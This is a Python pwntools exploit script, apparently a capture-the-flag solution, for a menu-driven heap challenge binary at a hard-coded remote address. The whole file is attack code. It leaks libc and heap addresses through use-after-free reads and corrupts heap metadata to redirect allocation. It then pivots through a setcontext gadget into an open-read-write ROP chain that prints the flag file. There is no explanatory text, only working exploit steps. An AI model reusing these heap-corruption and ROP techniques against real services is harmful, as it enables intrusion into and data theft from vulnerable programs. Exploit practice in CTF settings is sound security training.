from pwn import *

#p = process('./pwn')
p = remote('110.80.136.39',12838)
elf = ELF('./pwn')
libc = ELF('./libc.so')
context.log_level = 'debug'

def add(idx,size,context):
    p.sendlineafter('> ','1')
    p.sendlineafter('Input the index:',str(idx))
    p.sendlineafter('input the size of basketball:',str(size))
    p.sendafter('Input the dancer name:',context)

def delete(idx):
    p.sendlineafter('> ','2')
    p.sendlineafter('Input the idx of basketball:',str(idx))

def show(idx):
    p.sendlineafter('> ','3')
    p.sendlineafter('Input the idx of basketball:',str(idx))

def edit(idx,context):
    p.sendlineafter('> ','4')
    p.sendlineafter('Input the idx of basketball:',str(idx))
    p.sendlineafter('The new dance of the basketball:',context)

def trigger():
    p.sendlineafter('> ','1638')

def mmap_write(context):
    p.sendlineafter('> ','5')
    p.sendafter('Input the secret place:',context)

for i in range(6):
    add(0,0x90,'A')
    delete(0)

for i in range(7):
    add(0,0x150,'A')
    delete(0)

add(0,0x150,'A')
add(4,0x88,'B')
add(1,0x150,'A')
add(4,0x88,'B')
add(2,0x150,'A')
add(4,0x88,'B')

delete(0)
show(0)
p.recvuntil('Show the dance:')
data = u64(p.recv(6).ljust(8,'\x00'))
libc_base = data - 0x1c5be0 - 0x25000
log.success('libc base :'+hex(libc_base))

add(0,0xb0,'A')

delete(1)
add(3,0xb0,'A')#1's son
delete(2)

show(2)
p.recvuntil('Show the dance:')
data2 = u64(p.recv(6).ljust(8,'\x00'))
heap_base = data2 - 0x12a0
log.success('heap base :'+hex(heap_base))

add(4,0xb0,'A')

heap_part = heap_base + 0x10b0
edit(1,'\x00'*0xb8+p64(0xa1)+p64(heap_part)+p64(0x100000-0x10))

add(0,0x90,'A')

#0x0000000000154b90: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
#0x0000000000026bb2 : pop rdi ; ret
#0x0000000000066199: syscall; ret; 
#0x0000000000028ff4 : pop rax ; ret
#0x000000000002709c : pop rsi ; ret
#0x0000000000162dc6 : pop rdx ; pop rbx ; ret
payload = p64(0x100000)+p64(libc_base + 0x154b90)+p64(0x100000)
payload += p64(libc_base + 0x5803d)+p64(0) #setcontext
payload = payload.ljust(0x58,'\x00')
payload += './flag\x00\x00'
payload += p64(0x100000+0x60)
payload += p64(0)
payload = payload.ljust(0x98,'\x00')
payload += p64(0x100000+0xa8)
payload += p64(libc_base+0x28ff4)#0xa8
payload += p64(libc_base+0x28ff4)
payload += p64(2)
payload += p64(libc_base+0x66199)
#read
payload += p64(libc_base+0x26bb2)
payload += p64(5)#0xd0
payload += p64(libc_base+0x2709c)
payload += p64(0x100000+0x30)#0xe0
payload += p64(libc_base+0x162dc6)
payload += p64(0x30)#0xf0
payload += p64(0)
payload += p64(libc_base+libc.symbols['read'])#0x100
#write
payload += p64(libc_base+0x26bb2)
payload += p64(1)#0x110
payload += p64(libc_base+0x2709c)
payload += p64(0x100000+0x30)#0x120
payload += p64(libc_base+0x162dc6)
payload += p64(0x30)#0x130
payload += p64(0)
payload += p64(libc_base+libc.symbols['write'])

mmap_write(payload)

#gdb.attach(p)

trigger()

p.interactive()
